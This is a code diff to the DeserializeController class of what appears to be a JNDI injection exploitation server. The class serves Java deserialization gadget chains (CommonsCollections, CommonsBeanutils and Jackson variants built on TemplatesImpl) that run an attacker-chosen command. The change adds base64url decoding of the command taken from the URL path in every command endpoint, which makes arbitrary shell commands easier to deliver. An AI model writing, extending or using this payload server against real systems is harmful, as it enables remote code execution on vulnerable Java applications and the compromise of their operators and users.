@@ -4,6 +4,7 @@ import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import map.jndi.gadget.*;
+import map.jndi.util.MiscUtil;
 
 import java.util.*;
 
@@ -17,7 +18,7 @@ public class DeserializeController implements Controller {
     @JNDIMapping("/{data}")
     public byte[] deserialize(String data) {
         System.out.println("[Deserialize] Custom serialized data");
-        return Base64.getDecoder().decode(data);
+        return Base64.getUrlDecoder().decode(data);
     }
 
     @JNDIMapping("/URLDNS/{url}")
@@ -30,6 +31,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/CommonsCollectionsK1/Command/{cmd}")
     public byte[] CommonsCollectionsK1Cmd(String cmd) throws Exception {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[Deserialize] [CommonsCollectionsK1] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
@@ -48,6 +50,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/CommonsCollectionsK2/Command/{cmd}")
     public byte[] CommonsCollectionsK2Cmd(String cmd) throws Exception {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[Deserialize] [CommonsCollectionsK2] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
@@ -66,6 +69,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/CommonsCollectionsK3/Command/{cmd}")
     public byte[] CommonsCollectionsK3Cmd(String cmd) throws Exception {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[Deserialize] [CommonsCollectionsK3] [Command] Cmd: " + cmd);
 
         byte[] data = CommonsCollectionsK3.create(cmd);
@@ -74,6 +78,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/CommonsCollectionsK4/Command/{cmd}")
     public byte[] CommonsCollectionsK4Cmd(String cmd) throws Exception {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[Deserialize] [CommonsCollectionsK4] [Command] Cmd: " + cmd);
 
         byte[] data = CommonsCollectionsK4.create(cmd);
@@ -82,6 +87,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/CommonsBeanutils183/Command/{cmd}")
     public byte[] CommonsBeanutils183Cmd(String cmd) throws Exception {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[Deserialize] [CommonsBeanutils183] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
@@ -100,6 +106,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/CommonsBeanutils194/Command/{cmd}")
     public byte[] CommonsBeanutils194Cmd(String cmd) throws Exception {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[Deserialize] [CommonsBeanutils194] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
@@ -118,6 +125,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/Jackson/Command/{cmd}")
     public byte[] JacksonCmd(String cmd) throws Exception {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[Deserialize] [Jackson] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
